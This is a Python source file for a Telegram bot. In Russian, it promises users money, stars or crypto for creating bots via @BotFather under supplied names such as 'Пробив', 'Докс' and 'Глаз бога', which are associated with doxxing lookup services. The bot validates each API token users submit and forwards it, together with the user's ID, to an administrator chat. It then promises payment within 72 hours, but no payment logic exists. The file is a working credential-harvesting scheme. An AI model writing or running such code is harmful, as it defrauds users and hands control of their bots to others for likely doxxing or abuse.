import asyncio
import random
import string
import re
import aiohttp
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import config

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

DB_FILE = "used_tokens.txt"
BLACKLIST_FILE = "blacklist.txt"

NAMES = ["Вектор", "Виктор", "Пробив", "Пробить", "Докс", "Шоколадный глаз", "Глаз бога", "Пробивала", "Шерлок", "Духлес"]

def gen_username():
    letters = string.ascii_lowercase
    random_str = ''.join(random.choice(letters) for _ in range(8))
    return f"{random_str}_bot"

TOKEN_PATTERN = re.compile(r'^\d{8,10}:[a-zA-Z0-9_-]{35,45}$')

main_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="Подобрать задание ⚙️")]],
    resize_keyboard=True
)

# Проверка на валидность
async def check_token_validity(token: str):
    url = f"https://api.telegram.org/bot{token}/getMe"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=5) as response:
                if response.status == 200:
                    return await response.json()
                return None
        except:
            return None

# Работа с файлами (дубли и бан)
def is_listed(user_id, file_path):
    if not os.path.exists(file_path): return False
    with open(file_path, "r") as f:
        return str(user_id) in f.read().splitlines()

def save_to_file(data, file_path):
    with open(file_path, "a") as f:
        f.write(str(data) + "\n")

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if is_listed(message.from_user.id, BLACKLIST_FILE): return
    await message.answer(
        "👋 Привет! Здесь ты можешь сдать бота за деньги / звёзды / крипту.\n"
        "Нажми кнопку ниже, и я подберу задание для тебя.",
        reply_markup=main_kb
    )

@dp.message(F.text == "Подобрать задание ⚙️")
async def step_1(message: types.Message):
    if is_listed(message.from_user.id, BLACKLIST_FILE): return
    
    name = random.choice(NAMES)
    username = gen_username()
    
    await message.answer("1️⃣ Шаг первый:\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду /newbot.")
    await asyncio.sleep(1.5)
    await message.answer(f"Теперь перешлите название бота туда:\n`{name}`", parse_mode="MarkdownV2")
    await asyncio.sleep(1.5)
    await message.answer(f"2️⃣ Шаг второй:\nКогда он попросит юзернейм, отправьте это:\n`{username}`", parse_mode="MarkdownV2")
    await asyncio.sleep(1)
    await message.answer("3️⃣ Шаг третий:\nСкопируйте API токен от @BotFather и пришлите его мне!")

@dp.message()
async def handle_token(message: types.Message):
    if is_listed(message.from_user.id, BLACKLIST_FILE): return
    
    token = message.text.strip() if message.text else ""
    
    if TOKEN_PATTERN.match(token):
        if is_listed(token, DB_FILE):
            await message.answer("❌ Этот токен уже сдан!")
            return

        bot_data = await check_token_validity(token)
        if bot_data:
            save_to_file(token, DB_FILE)
            
            # --- ВОТ ТУТ ОТПРАВКА ЛОГА В ЧАТ ---
            log_text = (
                "📥 **НОВЫЙ ТОКЕН!**\n"
                f"👤 **Юзер:** @{message.from_user.username or 'id' + str(message.from_user.id)}\n"
                f"🆔 **ID:** `{message.from_user.id}`\n"
                f"🤖 **Бот:** @{bot_data['result']['username']}\n"
                f"🔑 **Токен:** `{token}`"
            )
            await bot.send_message(chat_id=config.ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
            # ----------------------------------
            
            await message.answer("✅ Принято! Ожидайте выплату в течение 72 часов.")
        else:
            await message.answer("❌ Нерабочий токен.")
    elif token != "Подобрать задание ⚙️":
        await message.answer("❌ Пришлите токен по инструкции.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
